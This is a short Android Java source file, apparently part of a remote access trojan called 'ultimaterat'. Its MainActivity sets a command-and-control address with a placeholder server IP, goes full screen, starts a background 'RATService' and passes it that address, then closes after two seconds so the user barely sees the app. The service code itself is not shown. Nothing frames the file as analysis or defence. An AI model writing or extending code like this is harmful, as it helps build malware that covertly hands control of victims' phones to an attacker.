package com.ultimaterat.client;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.WindowManager;

public class MainActivity extends Activity {
    private static final String C2_SERVER = "http://YOUR_SERVER_IP:3000";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Hide status bar and action bar
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        // Start RAT service
        Intent serviceIntent = new Intent(this, RATService.class);
        serviceIntent.putExtra("c2_server", C2_SERVER);
        startService(serviceIntent);

        // Exit after 2 seconds
        new Handler().postDelayed(() -> finish(), 2000);
    }
}